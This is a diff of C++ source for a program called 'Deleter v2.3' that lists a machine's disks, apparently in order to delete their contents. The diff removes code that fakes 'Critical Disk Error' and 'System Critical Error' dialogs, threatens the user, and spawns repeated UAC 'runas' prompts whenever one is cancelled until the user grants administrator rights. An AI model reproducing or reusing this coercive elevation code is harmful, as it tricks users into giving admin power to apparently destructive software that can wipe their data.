@@ -2,75 +2,9 @@
 #include <iostream>
 #include <string>
 #include <vector>
-#include <windows.h>
 using namespace std;
 using namespace std::filesystem;
-
-BOOL IsRunAsAdministrator() {
-  BOOL fIsRunAsAdmin = FALSE;
-  DWORD dwError = ERROR_SUCCESS;
-  PSID pAdministratorsGroup = NULL;
-
-  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
-  if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
-                                DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
-                                &pAdministratorsGroup)) {
-    dwError = GetLastError();
-    goto Cleanup;
-  }
-
-  if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin)) {
-    dwError = GetLastError();
-    goto Cleanup;
-  }
-
-Cleanup:
-
-  if (pAdministratorsGroup) {
-    FreeSid(pAdministratorsGroup);
-    pAdministratorsGroup = NULL;
-  }
-
-  if (ERROR_SUCCESS != dwError) {
-    throw dwError;
-  }
-
-  return fIsRunAsAdmin;
-}
-BOOL IsRunAsAdministrator();
-void ElevateNow() {
-  BOOL bAlreadyRunningAsAdministrator = FALSE;
-  try {
-    bAlreadyRunningAsAdministrator = IsRunAsAdministrator();
-  } catch (...) {
-    _asm nop
-  }
-  if (!bAlreadyRunningAsAdministrator) {
-    char szPath[MAX_PATH];
-    if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
-
-      SHELLEXECUTEINFO sei = {sizeof(sei)};
-
-      sei.lpVerb = "runas";
-      sei.lpFile = szPath;
-      sei.hwnd = NULL;
-      sei.nShow = SW_NORMAL;
-
-      if (!ShellExecuteEx(&sei)) {
-        DWORD dwError = GetLastError();
-        if (dwError == ERROR_CANCELLED)
-          // Annoys you to Elevate it LOL
-          CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ElevateNow, 0, 0, 0);
-      }
-    }
-
-  } else {
-	DeleterMain();
-  }
-}
 int DeleterMain() {
-  ElevateNow();
-  if (IsRunAsAdministrator()) {
     string Title = "Deleter v2.3";
     cout << Title << endl;
     vector<path> Disks; // Declare an empty vector
@@ -115,15 +49,4 @@ int DeleterMain() {
         }
       }
     }
-  } else {
-    if (MessageBox(0, "Need To Elevate", "Critical Disk Error",
-                   MB_SYSTEMMODAL | MB_ICONERROR | MB_YESNO) == IDYES) {
-      ElevateNow();
-    } else {
-      MessageBox(0, "You Better give me Elevation or I will attack u",
-                 "System Critical Error",
-                 MB_SYSTEMMODAL | MB_OK | MB_ICONERROR);
-      ElevateNow();
-    }
-  }
 }
